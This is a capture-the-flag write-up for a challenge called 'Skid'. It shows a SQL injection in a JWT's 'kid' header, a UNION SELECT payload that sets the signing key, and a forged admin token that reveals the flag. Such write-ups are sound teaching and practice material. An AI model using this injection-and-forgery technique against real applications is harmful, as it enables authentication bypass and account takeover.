# Skid

This was a hacking blog with a sign in page. Even if you are not signed in, there is a cookie named `skidtoken` containing a JWT:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6InNraWQifQ.eyJ1c2VybmFtZSI6InNraWQifQ.sacXoUrQCXpaylE4a4RGrCawHqBJJVGfOozOaPxQqOo
```

The header and payload sections decode to:
```json
{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "skid"
}
```

```json
{
  "username": "skid"
}
```

Tampering with the `kid` value in the header reveals a SQL injection vulnerability.

![SQL error](skid_sql_error.PNG)

Adding values to the UNION shows that there are three columns returned by the query. If we UNION the query with arbitrary string values, we can sign the JWT with whatever we want.

Final header and payload sections:
```json
{
  "typ": "JWT",
  "alg": "HS256",
  "kid": "aaaaaaa' UNION SELECT 'key','key','key';--"
}
```

```json
{
  "username": "admin"
}
```

Signing with the value `key` yields the new JWT:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6ImFhYWFhYWEnIFVOSU9OIFNFTEVDVCAna2V5Jywna2V5Jywna2V5JzstLSJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.EUb8sJ26d9T8QwkKL523ikI2CDEdPXLYl7s2P-KSLfk
```

Replace the `skidtoken` cookie with the new JWT and refresh the page to see the flag.

![Skid app with flag](skid.PNG)

`flag{sqli_jwt_neq_skid_stuff} `